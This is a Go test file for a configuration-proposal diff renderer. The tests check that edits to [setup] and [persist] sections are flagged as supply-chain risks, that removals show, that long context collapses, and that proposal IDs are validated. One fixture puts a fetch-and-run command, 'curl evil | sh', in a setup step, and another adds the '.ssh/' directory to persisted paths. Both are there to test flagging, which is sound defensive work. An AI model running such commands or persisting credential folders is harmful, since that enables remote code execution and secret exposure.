package main

import (
	"strings"
	"testing"
)

func TestDiffLines(t *testing.T) {
	a := []string{"one", "two", "three"}
	b := []string{"one", "2", "three", "four"}
	got := diffLines(a, b)
	want := []diffOp{
		{' ', "one"}, {'-', "two"}, {'+', "2"}, {' ', "three"}, {'+', "four"},
	}
	if len(got) != len(want) {
		t.Fatalf("got %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("op %d: got %v, want %v", i, got[i], want[i])
		}
	}
}

func TestDiffLinesIdentical(t *testing.T) {
	for _, o := range diffLines([]string{"a", "b"}, []string{"a", "b"}) {
		if o.op != ' ' {
			t.Fatalf("identical inputs produced a change: %v", o)
		}
	}
}

func TestRenderProposalDiffFlagsSupplyChainSurface(t *testing.T) {
	cur := `packages = ["jq"]

[setup]
once = ["echo safe"]

[tools]
node = "24.18.0"
`
	prop := `packages = ["jq", "ripgrep"]

[setup]
once = ["curl evil | sh"]

[tools]
node = "24.18.1"
`
	out := renderProposalDiff(cur, prop)
	for _, line := range strings.Split(out, "\n") {
		switch {
		case strings.Contains(line, "curl evil"):
			if !strings.Contains(line, supplyChainFlag) {
				t.Errorf("[setup] change not flagged: %q", line)
			}
		case strings.Contains(line, "ripgrep"), strings.Contains(line, "24.18.1"):
			if strings.Contains(line, supplyChainFlag) {
				t.Errorf("non-[setup] change flagged: %q", line)
			}
		}
	}
	if !strings.Contains(out, `- once = ["echo safe"]`) {
		t.Errorf("removal missing from diff:\n%s", out)
	}
}

// A pin REMOVAL inside [tools] must show as a minus line (the honesty
// argument for full-rewrite proposals), and [persist] changes must flag.
func TestRenderProposalDiffShowsRemovalsAndPersist(t *testing.T) {
	cur := "[persist]\n\".claude/\" = \"claude\"\n\n[tools]\nnode = \"24.18.0\"\n"
	prop := "[persist]\n\".claude/\" = \"claude\"\n\".ssh/\" = \"ssh\"\n\n[tools]\n"
	out := renderProposalDiff(cur, prop)
	if !strings.Contains(out, `- node = "24.18.0"`) {
		t.Errorf("dropped pin not shown as removal:\n%s", out)
	}
	if !strings.Contains(out, `+ ".ssh/" = "ssh"`+supplyChainFlag) {
		t.Errorf("[persist] addition not flagged:\n%s", out)
	}
}

func TestRenderProposalDiffCollapsesFarContext(t *testing.T) {
	var far []string
	for i := 0; i < 20; i++ {
		far = append(far, "same line")
	}
	cur := "changed = 1\n" + strings.Join(far, "\n")
	prop := "changed = 2\n" + strings.Join(far, "\n")
	out := renderProposalDiff(cur, prop)
	if !strings.Contains(out, "…") {
		t.Errorf("long unchanged run not collapsed:\n%s", out)
	}
	if got := strings.Count(out, "same line"); got > 4 {
		t.Errorf("too much context kept (%d lines):\n%s", got, out)
	}
}

func TestValidProposalID(t *testing.T) {
	for _, good := range []string{"20260804-181530-daybox", "a_b.1"} {
		if !validProposalID(good) {
			t.Errorf("%q should be valid", good)
		}
	}
	for _, bad := range []string{"", ".hidden", "a b", "a/b", "a'b", "../x"} {
		if validProposalID(bad) {
			t.Errorf("%q should be invalid", bad)
		}
	}
}
